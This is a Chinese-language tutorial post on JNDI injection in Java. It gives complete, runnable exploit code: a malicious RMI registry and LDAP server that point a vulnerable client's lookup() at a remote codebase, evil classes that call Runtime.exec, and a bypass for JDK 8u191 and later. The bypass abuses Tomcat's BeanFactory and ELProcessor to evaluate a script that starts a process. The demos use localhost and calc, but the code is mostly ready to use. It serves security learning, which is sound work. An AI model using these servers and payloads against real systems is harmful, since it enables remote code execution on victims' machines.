---
title: Java反序列化之JNDI注入漏洞
date: 2025-10-5 20:00:00
tags: JAVA
categories: JAVA安全-JAVA反序列化
---

## 环境要求

| 协议 | JDK6      | JDK7      | JDK8      | JDK11      |
| ---- | --------- | --------- | --------- | ---------- |
| LADP | 6u211以下 | 7u201以下 | 8u191以下 | 11.0.1以下 |
| RMI  | 6u132以下 | 7u122以下 | 8u113以下 | 无         |

# JNDI+rmi

## 原理

JNDI 注入，即当开发者在定义 `JNDI` 接口初始化时，`lookup()` 方法的参数可控，攻击者就可以将恶意的 `url` 传入参数远程加载恶意载荷，造成注入攻击。

### InitialContext类

#### 构造方法

```
InitialContext() 
构建一个初始上下文。  
InitialContext(boolean lazy) 
构造一个初始上下文，并选择不初始化它。  
InitialContext(Hashtable<?,?> environment) 
使用提供的环境构建初始上下文。 
```

#### 常用方法

```
bind(Name name, Object obj) 
	将名称绑定到对象。 
list(String name) 
	枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。
lookup(String name) 
	检索命名对象。 
rebind(String name, Object obj) 
	将名称绑定到对象，覆盖任何现有绑定。 
unbind(String name) 
	取消绑定命名对象。 
```

#### 代码

```java

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class jndi {
    public static void main(String[] args) throws NamingException {
        String uri = "rmi://127.0.0.1:1099/Exploit";    // 指定查找的 uri 变量
        InitialContext initialContext = new InitialContext();// 得到初始目录环境的一个引用
        initialContext.lookup(uri); // 获取指定的远程对象

    }
}
```

### JNDI+rmi注入漏洞

服务端代码

```java
package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class server {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        String url = "http://127.0.0.1:8080/";
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("test", "test", url);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("obj",referenceWrapper);
        System.out.println("running");
    }
}


```

客户端代码

```java
package org.example;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class client {
    public static void main(String[] args) throws NamingException {
        String url = "rmi://localhost:1099/obj";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(url);
    }
}

```

恶意文件

```java

import java.io.IOException;

public class test {
    public test() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}


```

将`test.java`编译为`test.class`，然后再`test.class`目录下起web服务，端口和上面服务端`Reference`端口相同，然后先运行服务端再运行客户端，客户端就会请求这个恶意的`class`文件

客户端去访问rmi服务器时，`rmi`服务器会返回一个`http`服务，客户端会请求这个`http`服务，`http`服务上就有我们的恶意类

# JDNI+LDAP

下载[unboundid-ldapsdk-3.2.0.jar](https://repo.maven.apache.org/maven2/com/unboundid/unboundid-ldapsdk/3.2.0/unboundid-ldapsdk-3.2.0.jar)，导入依赖：`项目结构->模块->添加模块->添加jar包`

pom.xml

```xml
<dependency>  
 <groupId>com.unboundid</groupId>  
 <artifactId>unboundid-ldapsdk</artifactId>  
 <version>3.2.0</version>  
 <scope>test</scope>  
</dependency>
```

`ldap_server`代码

```java
package org.example;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class LDAPServer {
    private static final String LDAP_BASE = "dc=example,dc=com";


    public static void main (String[] args) {

        String url = "http://127.0.0.1:8080/#Calculator";
        int port = 1234;


        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;


        /**
         *
         */
        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }


        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }


        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

`client`代码

```java
package org.example;

import javax.naming.InitialContext;
import javax.naming.NamingException;


public class LDAPClient {
    public static void main(String[] args) throws NamingException{
        String url = "ldap://127.0.0.1:1234/test";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(url);
    }

}
```

恶意类

```java
public class Calculator {
    public Calculator() throws Exception {
        Runtime.getRuntime().exec("calc");
    }
}
```

将恶意类编译为class文件，并且通过python起web服务，然后运行ldap服务器，在运行客户端访问

![image-20251006143624667](./JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20251006143624667.png)

# jdk版本在8u191之后的绕过方式

## 修复代码分析

修复代码

```java
// 旧版本JDK  
 /**  
 * @param className A non-null fully qualified class name.  
 * @param codebase A non-null, space-separated list of URL strings.  
 */  
 public Class<?> loadClass(String className, String codebase)  
 throws ClassNotFoundException, MalformedURLException {  
  
 ClassLoader parent = getContextClassLoader();  
 ClassLoader cl =  
 URLClassLoader.newInstance(getUrlArray(codebase), parent);  
  
 return loadClass(className, cl);  
 }  
  
  
// 新版本JDK  
 /**  
 * @param className A non-null fully qualified class name.  
 * @param codebase A non-null, space-separated list of URL strings.  
 */  
 public Class<?> loadClass(String className, String codebase)  
 throws ClassNotFoundException, MalformedURLException {  
 if ("true".equalsIgnoreCase(trustURLCodebase)) {  
 ClassLoader parent = getContextClassLoader();  
 ClassLoader cl =  
 URLClassLoader.newInstance(getUrlArray(codebase), parent);  
  
 return loadClass(className, cl);  
 } else {  
 return null;  
 }  
 }
```

### 旧版本行为

- 用 `getUrlArray(codebase)` 把 `codebase`（一串 URL）解析成 `URL[]`。
- 调用 `URLClassLoader.newInstance(urls, parent)` 创建类加载器。
- 用这个类加载器去加载 `className` 并返回 `Class<?>`。

也就是说**只要传来了一个远程 `codebase`，JVM 就会尝试下载并加载该 URL 下的类**。

### 新版本修复后的行为

增加了if判断，`trustURLCodebase`值为`true`才运行远程加载，但这个值默认为`false`

## 绕过方式

既然远程加载不行，那就使用本地加载，在服务端本地创建恶意class，该恶意 Factory 类必须实现 `javax.naming.spi.ObjectFactory` 接口，实现该接口的 getObjectInstance() 方法。

是因为JNDI 在解析返回对象时，期望远程对象（或 Reference 对象）能被某个实现了 `javax.naming.spi.ObjectFactory` 的类转换成可用的 Java 对象。

大佬找到的是这个 `org.apache.naming.factory.BeanFactory` 类，其满足上述条件并存在于 Tomcat8 依赖包中，应用广泛。该类的 `getObjectInstance()` 函数中会通过反射的方式实例化 Reference 所指向的任意 Bean Class(Bean Class 就类似于我们之前说的那个 CommonsBeanUtils 这种)，并且会调用 setter 方法为所有的属性赋值。而该 Bean Class 的类名、属性、属性值，全都来自于 Reference 对象，均是攻击者可控的。

需要添加依赖

```xml
<dependency>
<groupId>org.apache.tomcat</groupId>
<artifactId>tomcat-catalina</artifactId>
<version>8.5.56</version>
</dependency>
```

**恶意服务端代码 JNDIBypassHighJava.java**

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;  
import org.apache.naming.ResourceRef;  
  
import javax.naming.StringRefAddr;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
  
// JNDI 高版本 jdk 绕过服务端  
public class JNDIBypassHighJava {  
    public static void main(String[] args) throws Exception {  
        System.out.println("[*]Evil RMI Server is Listening on port: 1099");  
 Registry registry = LocateRegistry.createRegistry( 1099);  
 // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory  
 ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",  
 true,"org.apache.naming.factory.BeanFactory",null);  
 // 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码  
 ref.add(new StringRefAddr("forceString", "x=eval"));  
 // 利用表达式执行命令  
 ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +  
                ".newInstance().getEngineByName(\"JavaScript\")" +  
                ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));  
 System.out.println("[*]Evil command: calc");  
 ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);  
 registry.bind("Object", referenceWrapper);  
 }  
}
```

客户端

```java
import javax.naming.Context;  
import javax.naming.InitialContext;  
  
public class JNDIBypassHighJavaClient {  
    public static void main(String[] args) throws Exception {  
        String uri = "rmi://localhost:1099/Object";  
 Context context = new InitialContext();  
 context.lookup(uri);  
 }  
}
```

